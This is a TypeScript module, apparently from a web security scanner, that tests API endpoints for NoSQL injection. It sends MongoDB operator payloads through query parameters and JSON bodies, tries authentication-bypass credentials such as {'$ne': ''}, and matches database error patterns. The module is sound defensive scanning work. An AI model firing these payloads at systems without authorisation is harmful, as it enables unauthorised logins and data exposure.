import type { ScanModule, Finding } from "../types";
import { scanFetch } from "../fetch";

// NoSQL injection payloads for MongoDB-style backends
const NOSQL_PAYLOADS_GET = [
  // Operator injection via query params
  { param: "[$ne]", value: "", desc: "MongoDB $ne operator" },
  { param: "[$gt]", value: "", desc: "MongoDB $gt operator" },
  { param: "[$regex]", value: ".*", desc: "MongoDB $regex operator" },
  { param: "[$exists]", value: "true", desc: "MongoDB $exists operator" },
];

const NOSQL_JSON_PAYLOADS = [
  // JSON body injection
  { body: { "$gt": "" }, desc: "$gt operator in JSON" },
  { body: { "$ne": null }, desc: "$ne null in JSON" },
  { body: { "$regex": ".*" }, desc: "$regex wildcard in JSON" },
  { body: { "$where": "1==1" }, desc: "$where always-true" },
];

const NOSQL_AUTH_BYPASS = [
  // Auth bypass payloads
  { email: { "$ne": "" }, password: { "$ne": "" }, desc: "$ne empty string auth bypass" },
  { email: { "$gt": "" }, password: { "$gt": "" }, desc: "$gt empty string auth bypass" },
  { email: { "$regex": ".*" }, password: { "$ne": "" }, desc: "$regex wildcard auth bypass" },
];

const NOSQL_ERROR_PATTERNS = [
  /MongoError/i,
  /\bMongo\b.*\bfailed\b/i,
  /\bCastError\b/i,
  /\bBSONTypeError\b/i,
  /\bValidation.*failed\b/i,
  /\$where\b.*\bnot allowed\b/i,
  /\bunknown.*operator\b.*\$\w+/i,
  /\bbad.*query\b/i,
  /\bCannot.*\$\w+/i,
  /\billegal.*operator\b/i,
  /firestore.*error/i,
  /\bpermission.denied\b/i,
  /\binvalid.*filter\b/i,
];

export const nosqlInjectionModule: ScanModule = async (target) => {
  const findings: Finding[] = [];
  let count = 0;

  // Identify likely NoSQL-backed endpoints
  const isNoSqlStack = target.technologies.some((t) =>
    /mongo|firebase|firestore|dynamo|convex/i.test(t),
  );

  // Collect API endpoints to test
  const apiEndpoints = target.apiEndpoints.slice(0, 15);

  // Phase 1: Operator injection via query parameters
  const flagged = new Set<string>();

  for (const endpoint of apiEndpoints) {
    const pathname = new URL(endpoint).pathname;
    if (flagged.has(pathname)) continue;

    // Get baseline response
    let baselineText = "";
    let baselineStatus = 0;
    try {
      const res = await scanFetch(endpoint, { timeoutMs: 5000 });
      baselineStatus = res.status;
      baselineText = await res.text();
    } catch { continue; }

    // Skip if baseline already has errors
    if (NOSQL_ERROR_PATTERNS.some((p) => p.test(baselineText))) continue;

    // Test $ne and $gt operators on query params
    for (const { param, value, desc } of NOSQL_PAYLOADS_GET) {
      try {
        const url = new URL(endpoint);
        // Inject operator: /api/users?username[$ne]=
        const existingParams = [...url.searchParams.keys()];
        const testParams = existingParams.length > 0 ? existingParams : ["id", "email", "username"];

        for (const paramName of testParams.slice(0, 3)) {
          const testUrl = new URL(endpoint);
          testUrl.searchParams.delete(paramName);
          // Append the operator injection
          const injectedUrl = `${testUrl.href}${testUrl.search ? "&" : "?"}${paramName}${param}=${encodeURIComponent(value)}`;

          const res = await scanFetch(injectedUrl, { timeoutMs: 5000 });
          const text = await res.text();

          // Check for NoSQL error messages
          for (const pattern of NOSQL_ERROR_PATTERNS) {
            if (pattern.test(text) && !pattern.test(baselineText)) {
              flagged.add(pathname);
              findings.push({
                id: `nosql-error-${count++}`,
                module: "NoSQL Injection",
                severity: "high",
                title: `NoSQL error disclosure on ${pathname}`,
                description: `A NoSQL operator injection (${desc}) triggered a database error message. This reveals the database technology and suggests operator injection may be possible.`,
                evidence: `URL: ${injectedUrl}\nError pattern: ${pattern.source}\nResponse excerpt: ${text.substring(0, 300)}`,
                remediation: "Sanitize all query parameters before passing to database queries. Use an ORM/ODM with strict input typing. For MongoDB, reject objects in query parameters — only accept string/number values.",
                cwe: "CWE-943",
                owasp: "A03:2021",
              });
              break;
            }
          }
          if (flagged.has(pathname)) break;

          // Check for data leak: operator injection returns more data than baseline
          if (res.status === 200 && baselineStatus === 200) {
            const ct = res.headers.get("content-type") || "";
            if (ct.includes("application/json")) {
              try {
                const baseData = JSON.parse(baselineText);
                const injData = JSON.parse(text);
                const baseCount = Array.isArray(baseData) ? baseData.length : (baseData.data ? (Array.isArray(baseData.data) ? baseData.data.length : 1) : 1);
                const injCount = Array.isArray(injData) ? injData.length : (injData.data ? (Array.isArray(injData.data) ? injData.data.length : 1) : 1);

                // If operator injection returns significantly more records, it's bypassing filters
                if (injCount > baseCount * 2 && injCount > 3) {
                  flagged.add(pathname);
                  findings.push({
                    id: `nosql-bypass-${count++}`,
                    module: "NoSQL Injection",
                    severity: "critical",
                    title: `NoSQL injection bypasses filter on ${pathname}`,
                    description: `A ${desc} injection returned ${injCount} records vs ${baseCount} normally. The operator bypassed the intended query filter, exposing additional data.`,
                    evidence: `URL: ${injectedUrl}\nBaseline records: ${baseCount}\nInjected records: ${injCount}`,
                    remediation: "Never pass raw query parameters to MongoDB queries. Use mongoose schema validation or explicitly cast/validate each parameter type before querying.",
                    cwe: "CWE-943",
                    owasp: "A03:2021",
                  });
                }
              } catch { /* not parseable JSON */ }
            }
          }
        }
        if (flagged.has(pathname)) break;
      } catch { /* skip */ }
    }
  }

  // Phase 2: JSON body injection on POST endpoints
  const postEndpoints = apiEndpoints.filter((ep) =>
    /auth|login|signin|signup|register|user|search|query|filter/i.test(ep),
  );

  for (const endpoint of postEndpoints.slice(0, 5)) {
    const pathname = new URL(endpoint).pathname;
    if (flagged.has(pathname)) continue;

    // Get baseline with normal JSON body
    let baselineText = "";
    try {
      const res = await scanFetch(endpoint, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ test: "normal_value" }),
        timeoutMs: 5000,
      });
      baselineText = await res.text();
    } catch { continue; }

    if (NOSQL_ERROR_PATTERNS.some((p) => p.test(baselineText))) continue;

    for (const { body, desc } of NOSQL_JSON_PAYLOADS) {
      try {
        const res = await scanFetch(endpoint, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ value: body }),
          timeoutMs: 5000,
        });
        const text = await res.text();

        for (const pattern of NOSQL_ERROR_PATTERNS) {
          if (pattern.test(text) && !pattern.test(baselineText)) {
            flagged.add(pathname);
            findings.push({
              id: `nosql-json-${count++}`,
              module: "NoSQL Injection",
              severity: "high",
              title: `NoSQL injection via JSON body on ${pathname}`,
              description: `Sending a ${desc} payload in the JSON body triggered a database error. The server passes user-supplied objects directly to database queries.`,
              evidence: `Payload: ${JSON.stringify(body)}\nEndpoint: ${endpoint}\nError pattern: ${pattern.source}\nResponse excerpt: ${text.substring(0, 300)}`,
              remediation: "Validate that request body fields are the expected primitive types (string, number). Reject objects/arrays where primitives are expected. Use schema validation (Zod, Joi).",
              cwe: "CWE-943",
              owasp: "A03:2021",
            });
            break;
          }
        }
        if (flagged.has(pathname)) break;
      } catch { /* skip */ }
    }
  }

  // Phase 3: Auth bypass (only if NoSQL stack detected or auth endpoints found)
  if (isNoSqlStack || postEndpoints.some((ep) => /auth|login|signin/i.test(ep))) {
    const authEndpoints = postEndpoints.filter((ep) => /auth|login|signin/i.test(ep));

    for (const endpoint of authEndpoints.slice(0, 3)) {
      const pathname = new URL(endpoint).pathname;
      if (flagged.has(pathname)) continue;

      for (const payload of NOSQL_AUTH_BYPASS) {
        try {
          const res = await scanFetch(endpoint, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(payload),
            timeoutMs: 5000,
          });
          const text = await res.text();

          // Check if we got a successful auth response (token, session, redirect to dashboard)
          if (res.status === 200 || res.status === 302) {
            const ct = res.headers.get("content-type") || "";
            if (ct.includes("application/json")) {
              try {
                const data = JSON.parse(text);
                const hasToken = "token" in data || "accessToken" in data || "access_token" in data || "session" in data || "jwt" in data;
                if (hasToken) {
                  flagged.add(pathname);
                  findings.push({
                    id: `nosql-auth-bypass-${count++}`,
                    module: "NoSQL Injection",
                    severity: "critical",
                    title: `Authentication bypass via NoSQL injection on ${pathname}`,
                    description: `Sending ${payload.desc || "NoSQL operators"} as credentials returned an authentication token. Attackers can log in as any user without knowing their password.`,
                    evidence: `Endpoint: ${endpoint}\nPayload: ${JSON.stringify(payload)}\nResponse contains authentication token`,
                    remediation: "Validate that email/username/password fields are strings before querying. Use bcrypt/argon2 for password comparison — never query the database with user-supplied password objects.",
                    cwe: "CWE-943",
                    owasp: "A07:2021",
                  });
                  break;
                }
              } catch { /* skip */ }
            }
          }
        } catch { /* skip */ }
      }
    }
  }

  return findings;
};
